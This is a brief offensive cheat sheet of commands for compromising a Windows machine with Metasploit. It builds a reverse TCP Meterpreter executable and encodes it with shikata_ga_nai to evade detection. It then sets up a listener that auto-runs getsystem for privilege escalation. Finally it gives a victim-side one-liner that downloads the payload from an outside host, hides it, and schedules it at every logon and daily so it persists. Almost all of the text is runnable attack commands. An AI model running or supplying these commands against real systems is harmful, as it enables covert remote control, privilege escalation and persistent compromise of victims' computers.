## Using msfvenom for Reverse TCP Payload (Generate Encoded Payload with Evade Detection)

   ```
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=9002 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
   ```
   - `-a x86`: 32-bit architecture.
   - `-b "\x00"`: Avoid bad characters.
   - `-e`: Encoder (Shikata Ga Nai).
   - `-i 3`: Encoding iterations.

## Setup Listener (in msfconsole)
- Run `msfconsole` with privilege escalation.

 ```
 use exploit/multi/handler
 ```

- Setup Listener

 ```
 set payload windows/meterpreter/reverse_tcp
 set LHOST eth0
 set LPORT 9002
 set InitialAutoRunScript "post/windows/escalate/getsystem"
 exploit
 ```

- Waits for victim connection.

## Create Persistence on Victim

```
curl -o "%APPDATA%\background.exe" http://10.0.2.9:8080/payload.exe && attrib +h "%APPDATA%\background.exe" && schtasks /create /sc onlogon /tn "BackgroundOnLogon" /tr "\"%APPDATA%\background.exe\"" /f && schtasks /create /sc daily /st 10:00 /tn "BackgroundDaily" /tr "\"%APPDATA%\background.exe\"" /f && start "" "%APPDATA%\background.exe"
```
- Create task scheduler `BackgroundOnLogon` and `BackgroundDaily`
